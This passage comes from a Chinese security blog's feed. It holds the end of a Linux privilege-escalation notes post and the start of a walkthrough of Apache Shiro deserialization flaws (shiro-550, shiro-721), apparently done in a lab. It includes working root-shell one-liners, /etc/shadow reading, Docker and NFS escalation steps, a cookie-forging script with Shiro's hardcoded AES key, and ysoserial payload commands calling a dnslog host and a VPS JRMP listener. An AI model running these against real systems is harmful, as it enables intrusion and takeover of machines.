&quot;&#x2F;bin&#x2F;bash&quot;&#39;</span><br></pre></td></tr></table></figure><h2 id="cp-bypass"><a href="#cp-bypass" class="headerlink" title="cp bypass"></a>cp bypass</h2><p>直接用cp把/usr/bin里的命令复制过来就行了</p><h2 id="直接更改PATH-SHELL变量"><a href="#直接更改PATH-SHELL变量" class="headerlink" title="直接更改PATH/SHELL变量"></a>直接更改PATH/SHELL变量</h2><p>键入export -p 查看该用户的变量</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145455.png" alt="QQ截图20210217145455"></p><p>如果这俩变量有w权，那么我们可以直接写入来bypass</p><h2 id="ssh-bypass"><a href="#ssh-bypass" class="headerlink" title="ssh bypass"></a>ssh bypass</h2><p>原理是通过ssh链接当前IP的当前用户并启动/bin/bash</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh username@Ip -t &quot;&#x2F;bin&#x2F;bash&quot;</span><br></pre></td></tr></table></figure><h1 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h1><p>用 uanme -a 查明内核版本</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210311220036263.png" alt="image-20210311220036263"></p><p>然后找exp打就完事了，内核提权的内容有点底层，暂时不用深入了解</p><h1 id="passwd和shadow"><a href="#passwd和shadow" class="headerlink" title="passwd和shadow"></a>passwd和shadow</h1><h2 id="明文密码"><a href="#明文密码" class="headerlink" title="明文密码"></a>明文密码</h2><p>/etc/passwd 默认所有用户可读，但只有root可写。<br>/etc/passwd里的用户口令往往以x代替，其加密后的密码会存入/etc/shadow里面，/etc/shadow默认只有root可读。</p><p>但是有小概率情况，明文密码就直接出现在/etc/passwd了，如果有这个情况且root密码暴露在了passwd里，那么就可以轻而易举提权了</p><h2 id="passwd-可写"><a href="#passwd-可写" class="headerlink" title="passwd 可写"></a>passwd 可写</h2><p>如果/etc/passwd 我们当前用户可写，可以直接把root的密码改成一个明文密码，从而达到提权目的</p><h2 id="爆破shadow"><a href="#爆破shadow" class="headerlink" title="爆破shadow"></a>爆破shadow</h2><p>如果/etc/shadow 可读，我们可以用hashcat或者john暴力破解shadow文件</p><h1 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h1><h2 id="文件重写"><a href="#文件重写" class="headerlink" title="文件重写"></a>文件重写</h2><p>计划任务由crontab管理，非root用户是无法列出root用户的计划任务的，但我们可以列出/etc的系统任务，系统任务默认是root权限运行的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -l &#x2F;etc&#x2F;cron*</span><br></pre></td></tr></table></figure><p>如果我们有幸有权限能更改其中一个任务指定的脚本，我们就可以往脚本里添加如反弹shell等指令，从而提权</p><h2 id="环境变量劫持"><a href="#环境变量劫持" class="headerlink" title="环境变量劫持"></a>环境变量劫持</h2><p>我们查看定时任务</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316125520822.png" alt="image-20210316125520822"></p><p>发现定义了诸多环境变量，如果其任务有未指定绝对路径的指令，如</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">17 *    * * *   root    shell.sh</span><br></pre></td></tr></table></figure><p>而且我们在其环境变量路径中可以进行写入操作，那么我们可以通过写入环境变量的靠前路径一个同名恶意文件从而导致环境变量劫持</p><p>比如我们在/sbin 写入一个 反弹shell功能的shell.sh，那么就可以造成提权</p><h2 id="通配符提权"><a href="#通配符提权" class="headerlink" title="通配符提权"></a>通配符提权</h2><p><a href="https://www.secpulse.com/archives/72965.html">https://www.secpulse.com/archives/72965.html</a> 总结的太好了，我都不想记笔记了（偷懒</p><h1 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h1><p>如果我们找到一个suid权限的程序，但是我们无法完成suid提权，就可以试试搭配环境变量进行提权。</p><p>这个提权方法的思想是，找到有suid的，内部有system函数调用未指定路径的命令的文件。同时用户有修改自己环境变量的权限，</p><p>我们就可以通过劫持system函数里调用的脚本文件，使其指向我们环境变量里自行创建的一个同名脚本文件，那么这个我们自行创建的同名脚本文件就能以root权限运行了，如果这个脚本文件里的命令是/bin/bash，那么就相当于我们提权了。</p><p>可能有点小绕，看下面具体操作就行了。</p><p>实验室配置:</p><p>首先在一个目录下创建如下文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim demo.c</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210312183454821.png" alt="image-20210312183454821"></p><p>然后 gcc demo.c -o shell    将其编译为可执行文件</p><p>然后 chmod u+s shell           为其增加suid权限</p><p>攻击者视角:</p><p>首先使用下列指令搜寻suid权限文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210312184424019.png" alt="image-20210312184402084"></p><p>发现可疑目标，执行一下看看</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210312184424019.png" alt="image-20210312184424019"></p><p>发现返回了ps命令的结果，我们可以以此猜测这个文件内部 有 system(“ps”);  这条c语言代码。<br>遂可尝试环境变量提权</p><p>我们依次执行以下命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; ps</span><br><span class="line">export $PATH&#x3D;&#x2F;tmp:$PATH        需要修改自身环境变量的权限，但基本上都有这个权限</span><br><span class="line">chmod 777 .&#x2F;ps                 没这条命令会导致提权失败</span><br><span class="line">cd &#x2F;home&#x2F;const27</span><br><span class="line">.&#x2F;shell                        提权成功</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210312184905534.png" alt="image-20210312184905534"></p><h1 id="密码查找"><a href="#密码查找" class="headerlink" title="密码查找"></a>密码查找</h1><p>这个提权技术说白了，就是去到处翻密码</p><h2 id="文件内查找"><a href="#文件内查找" class="headerlink" title="文件内查找"></a>文件内查找</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep --color&#x3D;auto -rnw &#39;&#x2F;&#39; -ie &quot;PASSWORD&quot; --color&#x3D;always 2&gt; &#x2F;dev&#x2F;null</span><br><span class="line">find . -type f -exec grep -i -I &quot;PASSWORD&quot; &#123;&#125; &#x2F;dev&#x2F;null \;</span><br></pre></td></tr></table></figure><p>我们可以通过以上命令，指定关键字，在所有文件中搜索内容中有关键字的文件。</p><h2 id="查找十分钟内更改过的文件"><a href="#查找十分钟内更改过的文件" class="headerlink" title="查找十分钟内更改过的文件"></a>查找十分钟内更改过的文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -mmin -10 2&gt;&#x2F;dev&#x2F;null | grep -Ev &quot;^&#x2F;proc&quot;  (不显示^&#x2F;proc文件或文件夹)</span><br></pre></td></tr></table></figure><h1 id="capabilities"><a href="#capabilities" class="headerlink" title="capabilities"></a>capabilities</h1><p>capabilities 是linux2.2后出现的产物，它的出现一定程度上弥补了suid这种粗糙的权限管理机制，但是capabilities 自身也有造成提权的安全隐患</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>capabilities 把root的权限细分了，可以分别启用或者禁用。</p><p>在进行特权操作的时候，如果euid不是root，那么系统就会检查是否具有执行特权操作的对应capabilities ，并以此为凭据决定特权操作是否能被执行。</p><p>如下是一些常见的特权操作及其对应capabilities </p><table><thead><tr><th>改变文件的所属者(chown())</th><th align="left">CAP_CHOWN</th></tr></thead><tbody><tr><td>向进程发送信号(kill(), signal())</td><td align="left">CAP_KILL</td></tr><tr><td>改变进程的uid(setuid(), setreuid(), setresuid()等)</td><td align="left">CAP_SETUID</td></tr><tr><td>trace进程(ptrace())</td><td align="left">CAP_SYS_PTRACE</td></tr><tr><td>设置系统时间(settimeofday(), stime()等)</td><td align="left">CAP_SYS_TIME</td></tr><tr><td>忽略文件读及目录搜索的DAC访问限制</td><td align="left">CAP_DAC_READ_SEARCH</td></tr></tbody></table><p>关于capabilities的管理工具有如下:</p><ul><li>getcap</li><li>setcap</li><li>capsh</li><li>filecap</li></ul><p>getcap 用于查询capabilities，setcap用于设置capabilities，capsh用于查当前shell进程的capabilities，filecap既能设置又能查询。</p><p>我们可以通过以下指令搜索设置了capabilities的可执行文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><h3 id="通过cap-setuid"><a href="#通过cap-setuid" class="headerlink" title="通过cap_setuid"></a>通过cap_setuid</h3><p>cap_setuid 可以设置当前用户的euid，我们可以通过此选项来进行一些提权。</p><p>以python为例</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316201948608.png" alt="image-20210316201948608"></p><p>我们发现python3.8 有cap_setuid权限，那么我们可以用以下指令进行提权</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import os; os.setuid(0); os.system(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316202912697.png" alt="image-20210316202912697"></p><p>类似的有很多。</p><p>perl</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &#39;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39;</span><br></pre></td></tr></table></figure><p>gdb</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb -nx -ex &#39;python import os; os.setuid(0)&#39; -ex &#39;!sh&#39; -ex quit</span><br></pre></td></tr></table></figure><p>php</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &quot;posix_setuid(0); system(&#39;&#x2F;bin&#x2F;sh&#39;);&quot;</span><br></pre></td></tr></table></figure><p>python</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import os; os.setuid(0); os.system(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;</span><br></pre></td></tr></table></figure><p>rvim</p><p>需要支持python3模块。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rvim -c &#39;:py import os; os.setuid(0); os.execl(&quot;&#x2F;bin&#x2F;sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#39;</span><br></pre></td></tr></table></figure><p>vim</p><p>需要支持python3模块。<code>vim --version</code>查询，是否支持py3</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim -c &#39;:py import os; os.setuid(0); os.execl(&quot;&#x2F;bin&#x2F;sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#39;</span><br></pre></td></tr></table></figure><h3 id="通过CAP-DAC-READ-SEARCH"><a href="#通过CAP-DAC-READ-SEARCH" class="headerlink" title="通过CAP_DAC_READ_SEARCH"></a>通过CAP_DAC_READ_SEARCH</h3><p>cap_dac_read_search可以绕过文件的读权限检查以及目录的读/执行权限的检查。</p><p>利用此特性我们可以读取系统中的敏感信息。</p><p>如果tar有此权限，我们可以通过此来查看敏感文件内容。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar cvf shadow.tar &#x2F;etc&#x2F;shadow  &#x2F;&#x2F;创建压缩文件</span><br><span class="line"></span><br><span class="line">tar -xvf shadow.tar  &#x2F;&#x2F;解压缩</span><br><span class="line"></span><br><span class="line">cd etc  &#x2F;&#x2F;进入解压缩的目录</span><br><span class="line"></span><br><span class="line">chmod +r shadow  &#x2F;&#x2F;赋予读权限</span><br><span class="line"></span><br><span class="line">cat shadow | grep root  &#x2F;&#x2F;查看shadow文件的内容</span><br></pre></td></tr></table></figure><h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><h2 id="Docker用户组提权"><a href="#Docker用户组提权" class="headerlink" title="Docker用户组提权"></a>Docker用户组提权</h2><p>如果我们拿到了一个Docker用户组的用户权限，那么我们可以很轻松地完成提权</p><p>首先我们执行如下命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -v &#x2F;:&#x2F;mnt --rm -it crf_web1 chroot &#x2F;mnt sh</span><br></pre></td></tr></table></figure><p>然后在其中的/etc/passwd中写入一个root权限用户（我这里直接无密码了）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316205908273.png" alt="image-20210316205908273"></p><p>然后退出来，直接尝试 su root2</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316210009057.png" alt="image-20210316210009057"></p><p>提权成功</p><h1 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h1><p>NFS 是一个用来共享目录的东西，但若配置权限不当则会引发安全问题</p><h2 id="no-root-squash"><a href="#no-root-squash" class="headerlink" title="no_root_squash"></a>no_root_squash</h2><p>我们cat /etc/exports 如果有no_root_squash字样，则说明root用户就会对共享目录拥有至高的权限控制，就像是对本机的目录操作一样。</p><p>也就是说，任何机器的root在此目录上都有最高权限。</p><p>我们在获得一台机器的root权限后，可以通过nfs在另一台低权限机器上实现提权</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;tmp&#x2F;nfs</span><br><span class="line">mount -o rw,vers&#x3D;3 10.10.10.10:&#x2F;tmp &#x2F;tmp&#x2F;nfs 将本机上的&#x2F;tmp&#x2F;nfs 挂载到共享目录</span><br><span class="line">cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;nfs&#x2F;bash</span><br><span class="line">chmod u+s &#x2F;tmp&#x2F;nfs&#x2F;bash  设置共享目录上bash的suid</span><br></pre></td></tr></table></figure><p>回到低权限机，执行 /tmp/bash  完成提权</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;sudo-和-suid-提权&quot;&gt;&lt;a href=&quot;#sudo-和-suid-提权&quot; class=&quot;headerlink&quot; title=&quot;sudo 和 suid 提权&quot;&gt;&lt;/a&gt;sudo 和 suid 提权&lt;/h1&gt;&lt;h2 id=&quot;何为suid&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
    <category term="提权" scheme="http://const27.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>shiro反序列化(shiro-550与shiro-721)</title>
    <link href="http://const27.com/2021/03/12/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://const27.com/2021/03/12/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-03-12T06:33:07.978Z</published>
    <updated>2021-03-10T14:44:19.209Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h1><p>Apache shiro 是java的一个安全框架，可以帮助完成认证，授权，加密，会话管理等功能。它不跟任何框架或容器绑定，可以独立运行。</p><h1 id="shiro-550"><a href="#shiro-550" class="headerlink" title="shiro-550"></a>shiro-550</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>当shiro版本小于1.2.5时，主要是由shiro的rememberMe内容反序列化导致的命令执行漏洞，造成的原因是AES密钥被硬编码在shiro源码中，这就导致了可以通过在cookie的rememberMe字段插入payload实现任意代码执行</p><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>git clone <a href="https://github.com/apache/shiro.git">https://github.com/apache/shiro.git</a> 下载shiro</p><p>然后 git checkout shiro-root-1.2.4,切换到1.2.4版本进行对应版本的漏洞调试</p><p>编辑shiro/samples/web/pom.xml文件，在此处加入 <version>1.2</version> </p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309141612431.png" alt="image-20210309141612431"></p><p>然后idea打开shiro/samples/web 下的pom.xml,然后Run -&gt; Edit Configurations 添加TomcatServer</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309142858354.png" alt="image-20210309142858354"></p><p>待idea加载完maven后，向tomcat部署工件</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309143500761.png" alt="image-20210309143500761"></p><p>出现以下页面则说明环境搭建成功</p><p><img src="C:\Users\14216\AppData\Roaming\Typora\typora-user-images\image-20210309143605131.png" alt="image-20210309143605131"></p><h2 id="开始动调"><a href="#开始动调" class="headerlink" title="开始动调"></a>开始动调</h2><h3 id="序列化，加密"><a href="#序列化，加密" class="headerlink" title="序列化，加密"></a>序列化，加密</h3><p>在org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin 处下断点<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309144449196.png" alt="image-20210309144449196"></p><p>然后进入shiro登陆页面，勾选<em>rememberme</em>，进行登录，断点命中</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309144539506.png" alt="image-20210309144539506"></p><p>然后会校验token里面的rememberme是否为true，若为true则执行rememberIdentity函数</p><p>我们跟进rememberIdentity函数</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309145259149.png" alt="image-20210309145259149"></p><p>发现principals变量获取了需要remember的用户名（此处为root），然后再调用重载函数rememberIdentity。<br>这个函数调用了convertPrincipalsToBytes,我们跟进看看这个函数</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309145901675.png" alt="image-20210309145901675"></p><p>可以发现对传入的principals调用了serialize方法，继续跟进serialize方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309150019544.png" alt="image-20210309150019544"></p><p>继续跟进serialize会来到这个地方</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309150133277.png" alt="image-20210309150133277"></p><p>发现就是对其调用了writeObject()这个原生反序列方法而已，没什么好康的，转回头去看看convertPrincipalsToBytes那个加密函数encrypt</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309152804516.png" alt="image-20210309152804516"></p><p>发现通过getCipherService方法返回了一个东西，发现是加密方式等东西</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309153312468.png" alt="image-20210309153312468"></p><p>在此处156行会调用另一个encrypt方法，其中第一个参数是序列化后的用户名，第二个参数则是密钥（这个密钥是硬编码写入文件的，所以造成了安全问题）我们跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309154512813.png" alt="image-20210309154512813"></p><p>这里的ivBytes是一个随机生成的iv（我没跟进细看),然后在这个方法最后它调用了encrypt的重载函数，并传入了序列化后的用户名，key，iv，以及一个true。我们继续跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309155203309.png" alt="image-20210309155203309"></p><p>可以发现通过arraycopy，把iv和加密后的密文数据（aes）放入了output,最后返回了output. 然后这个return会一直返回到此处</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309155606194.png" alt="image-20210309155606194"></p><p>output的内容作为参数传入了rememberSerializedIdentity，跟进该函数</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309155736406.png" alt="image-20210309155736406"></p><p>56行，把base64加密后的output作为值写入到cookie中的remembername键</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309162524164.png" alt="image-20210309162524164"></p><p>57行将其返回给客户端</p><p>burp抓包发现事实确实如此</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309162406182.png" alt="image-20210309162406182"></p><p>另外说一下那个硬编码key，那个硬编码的key在AbstractRememberMeManager.class DEFAULT_CIPHER_KEY_BYTES里</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309163021784.png" alt="image-20210309163021784"></p><p>可以发现通过getEncryptionCipherKey获得的key确实是DEFAULT_CIPHER_KEY_BYTES</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309164110278.png" alt="image-20210309164110278"></p><p>我们简要的梳理一下这个流程， 当我们勾选rememberme后，用户名会被序列化处理，然后与硬编码的key，随机生成的iv一起进行加密，然后以 iv+密文 的base64编码返回给用户的键为rememberme的cookie里。</p><h3 id="反序列化，解密"><a href="#反序列化，解密" class="headerlink" title="反序列化，解密"></a>反序列化，解密</h3><p>在我们勾选rememberme登陆后，刷新，抓包，将其JSESSIONID删除，使shiro验证cookie中rememberme的值是否正确（如果不删除JSESSIONID，shiro则直接以JSESSIONID为登陆凭证了，就不会验证rememberme中的值了）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309213036364.png" alt="image-20210309213036364"></p><p>在org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity 打下断点，放包，断点命中。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309213222271.png" alt="image-20210309213222271"></p><p>跟进getRememberedPrincipals方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309213255317.png" alt="image-20210309213255317"></p><p>随后再跟进getRememberedSerializedIdentity</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309213345511.png" alt="image-20210309213345511"></p><p>关注这里的86行，此处的意思是从cookie中获得base64编码后的cookie值，随后在90行对其进行填充（CBC加密中的一个流程），95行进行base64解码，并将其返回</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309214329614.png" alt="image-20210309214329614"></p><p>随后我们回到getRememberedPrincipals方法，跟进其convertBytesToPrincipals方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309214559031.png" alt="image-20210309214559031"></p><p>发现其中有个decrypt方法，这里的decrypt方法就是对其行aes解密，取前十六位为IV。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309214846036.png" alt="image-20210309214846036"></p><p>下面140行则是对其进行反序列化处理了。我们跟进一下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309214941029.png" alt="image-20210309214941029"></p><p>再次跟进deserialize方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309215227753.png" alt="image-20210309215227753"></p><p>看到readObject,就意味着反序列化流程结束了。</p><p>梳理一下，cookie中remenber值传入后先base64解码，然后aes解密，然后反序列化。</p><h3 id="解密，重写cookie，以写入payload"><a href="#解密，重写cookie，以写入payload" class="headerlink" title="解密，重写cookie，以写入payload"></a>解密，重写cookie，以写入payload</h3><p>既然key是固定的，我们知道了key是什么，同时在CBC解密的时候，IV的作用只是作为第一个区块去解密第二个区块（生成的结果去解密第三个区块，以此类推），所以IV可以为随机值没什么特别要求（只要能解密就行了）那么我们就可以自己伪造一个cookie。</p><p>python脚本如下(嫖的笑师傅的)，序列化payload用base64格式传入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#pip install pycrypto</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">import uuid</span><br><span class="line">from random import Random</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">key  &#x3D;  &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br><span class="line">mode &#x3D;  AES.MODE_CBC</span><br><span class="line">IV   &#x3D; uuid.uuid4().bytes</span><br><span class="line">encryptor &#x3D; AES.new(base64.b64decode(key), mode, IV)</span><br><span class="line"></span><br><span class="line">payload&#x3D;base64.b64decode(sys.argv[1])</span><br><span class="line">BS   &#x3D; AES.block_size</span><br><span class="line">pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">payload&#x3D;pad(payload)</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(IV + encryptor.encrypt(payload)))</span><br></pre></td></tr></table></figure><p>然后我们只需要传入base64编码的，去除换行符的payload即可。</p><p>像这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar .&#x2F;ysoserial-master-SNAPSHOT.jar URLDNS &quot;http:&#x2F;&#x2F;cao.7squwf.dnslog.cn&quot; |base64|sed &#39;:label;N;s&#x2F;\n&#x2F;&#x2F;;b label&#39;</span><br></pre></td></tr></table></figure><h4 id="密钥获取"><a href="#密钥获取" class="headerlink" title="密钥获取"></a>密钥获取</h4><p>有些时候key并不是一成不变的kPH+bIxk5D2deZiIxcaaaA==，而有可能是其他值，我们可以用工具<a href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a> 来爆破出密钥</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python .\shiro_exploit.py -u http:&#x2F;&#x2F;127.0.0.1:8080 </span><br></pre></td></tr></table></figure><p>即可开始爆破，当然这个工具的作用不仅仅如此</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310132845771.png" alt="image-20210310132845771"></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p>这个链其实根本没啥危害..只是拿来测试一下有没有洞</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar .&#x2F;ysoserial-master-SNAPSHOT.jar URLDNS &quot;http:&#x2F;&#x2F;cao.7squwf.dnslog.cn&quot; |base64|sed &#39;:label;N;s&#x2F;\n&#x2F;&#x2F;;b label&#39;</span><br></pre></td></tr></table></figure><p>生成payload，像cookie伪造脚本传入，获得伪造的cookie</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310115008147.png" alt="image-20210310115008147"></p><p>rememberme登陆后，刷新抓包，删除cookie中的session，替换cookie中的rememberme为伪造后的cookie。放包,DNSLOG有反应</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310115425170.png" alt="image-20210310115425170"></p><h3 id="cc链"><a href="#cc链" class="headerlink" title="cc链"></a>cc链</h3><h5 id="cc链2"><a href="#cc链2" class="headerlink" title="cc链2"></a>cc链2</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar .&#x2F;ysoserial-master-SNAPSHOT.jar CommonsCollections2 &quot;calc&quot;|base64 |sed &#39;:label;N;s&#x2F;\n&#x2F;&#x2F;;b label&#39;</span><br></pre></td></tr></table></figure><p>然后制作cookie，发过去，成功弹计算器</p><h5 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h5><p>通过运行mvn dependency:list 命令可以发现当前Commons Collections 的版本是3.2.1</p><p>按理说会有cc链5，但是实际上用ysoserial 生成payload用上面的方法打过去后没有反应。看别人博客发现是这个原因 “Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。” 解决这种问题的办法是用JRMP</p><p>vps上执行以下命令，监听端口</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 12006 CommonsCollections5 &#39;calc&#39;</span><br></pre></td></tr></table></figure><p>我们再通过ysoserial生成payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master-SNAPSHOT.jar JRMPClient &#39;vps_ip:12006&#39;|base64|sed &#39;:label;N;s&#x2F;\n&#x2F;&#x2F;;b label&#39;</span><br></pre></td></tr></table></figure><p>然后伪造cookie，发过去，成功弹计算器</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310194746492.png" alt="image-20210310194746492"></p><h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>这个洞因为cookie中的值使用硬编码的key加密而成，我们可以以此来伪造cookie，顺便在cookie里写入危险的paylaod如cc链payload，使cookie中的值被解密，随后经历反序列化，造成命令执行</p><p>参考：<a href="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E</a> 笑师傅大大</p><h1 id="shiro-721"><a href="#shiro-721" class="headerlink" title="shiro-721"></a>shiro-721</h1><p>去年学的Padding Oracle 在此处被利用了起来。可以先看看Padding Oracle Attack 大概是个啥<a href="https://const27.com/2021/02/19/Padding%20oracle%20Attack%E4%B8%8ECBC%E7%BF%BB%E8%BD%AC%E5%AD%97%E8%8A%82%E6%94%BB%E5%87%BB/">https://const27.com/2021/02/19/Padding%20oracle%20Attack%E4%B8%8ECBC%E7%BF%BB%E8%BD%AC%E5%AD%97%E8%8A%82%E6%94%BB%E5%87%BB/</a></p><p>影响版本：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.2.5, </span><br><span class="line">1.2.6, </span><br><span class="line">1.3.0, </span><br><span class="line">1.3.1, </span><br><span class="line">1.3.2, </span><br><span class="line">1.4.0-RC2, </span><br><span class="line">1.4.0, </span><br><span class="line">1.4.1</span><br></pre></td></tr></table></figure><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>其实漏洞代码层面逻辑上和shiro-550大致相似，只不过key没有硬编码进代码中了。<br>但是只要我们获得一个rememberme用户的cookie后就可以通过padding oracle attack 伪造任意cookie发过去了，从而造成反序列化漏洞了</p><h2 id="环境搭建"><a href="#环境搭建" 